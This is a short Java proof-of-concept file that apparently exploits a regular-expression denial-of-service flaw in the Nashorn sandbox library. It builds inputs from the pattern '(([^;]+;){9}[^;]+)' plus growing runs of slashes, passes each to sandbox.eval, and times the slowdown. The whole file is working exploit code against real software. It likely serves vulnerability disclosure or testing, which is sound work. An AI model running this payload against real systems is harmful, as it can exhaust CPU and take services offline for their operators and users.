package com.SugarP1g.nashorn;

import com.mifmif.common.regex.Generex;
import delight.nashornsandbox.NashornSandbox;
import delight.nashornsandbox.NashornSandboxes;

import javax.script.ScriptException;

public class ReDoSPOC {

    public String getMatchStr(String regex, int repl) {
        Generex generex = new Generex(regex);
        // Generate random String
        String randomStr = generex.random();
        StringBuffer sb = new StringBuffer();
        sb.append(randomStr);
        sb.append(";\n");
        for (int i = 0; i < repl; i++) {
            sb.append("/");
        }
        return sb.toString();

    }

    public static void main(String[] args) throws ScriptException {
        NashornSandbox sandbox = NashornSandboxes.create();
        ReDoSPOC obj = new ReDoSPOC();
        for (int i = 10; i <= 50; i++) {
            long startTime = System.currentTimeMillis();
            String js_script = obj.getMatchStr("(([^;]+;){9}[^;]+)", i);
            try {
                Object x = sandbox.eval(js_script);
            } catch (Exception e) {

            }
            long endTime = System.currentTimeMillis();
            System.out.println("Cost time: " + (endTime - startTime) + " ms.");
        }
    }
}
